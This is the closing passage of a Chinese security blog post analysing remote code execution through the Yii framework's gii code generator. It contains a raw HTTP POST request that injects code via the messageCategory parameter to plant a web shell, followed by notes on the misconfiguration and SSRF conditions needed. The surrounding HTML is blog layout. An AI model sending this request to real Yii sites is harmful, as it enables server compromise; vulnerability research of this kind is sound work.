+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**第五步触发&#96;payload&#96;**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>POST /index.php?r=gii%2Fdefault%2Fview&amp;id=form<br>….<br>Cookie: advanced-frontend=v0vji57g85r5f86vaq33d2r2ql; _csrf-frontend=2da2e03e83db1f567b0e982d938cef81177635ac9010fdb022725d46c1ba47e7a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22KZs_WMMabPAuyQ8PnASuGdgmmHXZjP17%22%3B%7D;</p>
+<p>_csrf-frontend=fbkkcHKXeYqr8xJFefhgXlAVGaDphTfbJcWeXh1oZzg241cvJdo068mjUzAAqVgOPlRK1a7hULZIjcYEdzhWDw%3D%3D&amp;Generator%5BviewName%5D=Aaaa&amp;Generator%5BmodelClass%5D=app%5Cmodels%5CAaaa&amp;Generator%5BscenarioName%5D=&amp;Generator%5BviewPath%5D=%40app%2Fviews&amp;Generator%5BenableI18N%5D=0&amp;Generator%5BmessageCategory%5D=app%27sssssssff&amp;Generator%5Btemplate%5D=default&amp;preview=</p>
+<p>```</p>
+<p>成功生成<code>shell</code></p>
+<p>地址：<code>http://xxx.xxx.xxx.xxx/test.php</code></p>
+<h4 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h4><p>从这可以看出这个漏洞要想被利用</p>
+<ul>
+<li>配置错误，导致所有<code>ip</code>可访问<code>gii</code>模块</li>
+<li>完整的<code>SSRF</code><ul>
+<li>需要传入<code>post</code>数据</li>
+<li>需要携带<code>cookie</code>参数</li>
+</ul>
+</li>
+</ul>
+<p><strong>总结</strong></p>
+<p>同上个<code>cookie</code>中的<code>rce</code>一样，存在小概率盲打的可能，但是不大</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">q3sec</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/02/22/YII%E6%A1%86%E6%9E%B6%E4%B8%ADgii%E6%A8%A1%E5%9D%97%E7%9A%84RCE/">http://example.com/2021/02/22/YII%E6%A1%86%E6%9E%B6%E4%B8%ADgii%E6%A8%A1%E5%9D%97%E7%9A%84RCE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">q3sec's blogs</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div><div class="post_share"><div class="social-share" data-image="https://img-blog.csdnimg.cn/2021022217435673.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/02/20/YII%E6%A1%86%E6%9E%B61-37%E7%89%88%E6%9C%AC%E9%80%9A%E7%94%A8%E9%93%BE/"><img class="next-cover" src="https://img-blog.csdnimg.cn/20210220130230348.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">YII框架1-37版本通用链</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/29/Tinyshop代码审计/" title="Tinyshop代码审计"><img class="cover" src="https://img-blog.csdnimg.cn/20210129193147471.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-29</div><div class="title">Tinyshop代码审计</div></div></a></div><div><a href="/2021/02/20/YII框架中cookie导致的RCE/" title="YII框架中cookie导致的RCE"><img class="cover" src="https://img-blog.csdnimg.cn/20210118193540678.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-20</div><div class="title">YII框架中cookie导致的RCE</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">q3sec</div><div class="author-info__description">个人技术博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">117</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我们的征途是星辰大海</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#YII%E6%A1%86%E6%9E%B6%E7%9A%84gii%E6%A8%A1%E5%9D%97RCE"><span class="toc-number">1.</span> <span class="toc-text">YII框架的gii模块RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.0.1.</span> <span class="toc-text">背景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-gt-%E8%AE%A4%E8%AF%81"><span class="toc-number">1.1.</span> <span class="toc-text">限制-&gt;认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Preview%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">Preview过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Generate%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">Generate过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E6%89%A9%E5%B1%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">模块扩展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90payload"><span class="toc-number">1.4.</span> <span class="toc-text">抓包分析payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E8%AF%9D"><span class="toc-number">1.4.1.</span> <span class="toc-text">后话</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/22/YII%E6%A1%86%E6%9E%B6%E4%B8%ADgii%E6%A8%A1%E5%9D%97%E7%9A%84RCE/" title="YII框架中gii模块的RCE"><img src="https://img-blog.csdnimg.cn/2021022217435673.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="YII框架中gii模块的RCE"/></a><div class="content"><a class="title" href="/2021/02/22/YII%E6%A1%86%E6%9E%B6%E4%B8%ADgii%E6%A8%A1%E5%9D%97%E7%9A%84RCE/" title="YII框架中gii模块的RCE">YII框架中gii模块的RCE</a><time datetime="2021-02-22T09:41:05.000Z" title="发表于 2021-02-22 17:41:05">2021-02-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/20/YII%E6%A1%86%E6%9E%B61-37%E7%89%88%E6%9C%AC%E9%80%9A%E7%94%A8%E9%93%BE/" title="YII框架1-37版本通用链"><img src="https://img-blog.csdnimg.cn/20210220130230348.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="YII框架1-37版本通用链"/></a><div class="content"><a class="title" href="/2021/02/20/YII%E6%A1%86%E6%9E%B61-37%E7%89%88%E6%9C%AC%E9%80%9A%E7%94%A8%E9%93%BE/" title="YII框架1-37版本通用链">YII框架1-37版本通用链</a><time datetime="2021-02-20T11:19:27.000Z" title="发表于 2021-02-20 19:19:27">2021-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/20/YII%E6%A1%86%E6%9E%B6%E4%B8%ADcookie%E5%AF%BC%E8%87%B4%E7%9A%84RCE/" title="YII框架中cookie导致的RCE"><img src="https://img-blog.csdnimg.cn/20210118193540678.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="YII框架中cookie导致的RCE"/></a><div class="content"><a class="title" href="/2021/02/20/YII%E6%A1%86%E6%9E%B6%E4%B8%ADcookie%E5%AF%BC%E8%87%B4%E7%9A%84RCE/" title="YII框架中cookie导致的RCE">YII框架中cookie导致的RCE</a><time datetime="2021-02-20T09:12:46.000Z" title="发表于 2021-02-20 17:12:46">2021-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/20/YII%E6%A1%86%E6%9E%B62-0-40%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" title="YII框架2.0.40反序列化pop链"><img src="https://img-blog.csdnimg.cn/20210220130230348.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="YII框架2.0.40反序列化pop链"/></a><div class="content"><a class="title" href="/2021/02/20/YII%E6%A1%86%E6%9E%B62-0-40%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" title="YII框架2.0.40反序列化pop链">YII框架2.0.40反序列化pop链</a><time datetime="2021-02-20T05:00:14.000Z" title="发表于 2021-02-20 13:00:14">2021-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/19/ke361%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ke361代码审计"><img src="https://img-blog.csdnimg.cn/20210219154636508.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ke361代码审计"/></a><div class="content"><a class="title" href="/2021/02/19/ke361%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ke361代码审计">ke361代码审计</a><time datetime="2021-02-19T07:41:49.000Z" title="发表于 2021-02-19 15:41:49">2021-02-19</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://img-blog.csdnimg.cn/20201102182821174.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By q3sec</div><div class="footer_custom_text">欢迎来到我的博客~~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":300,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
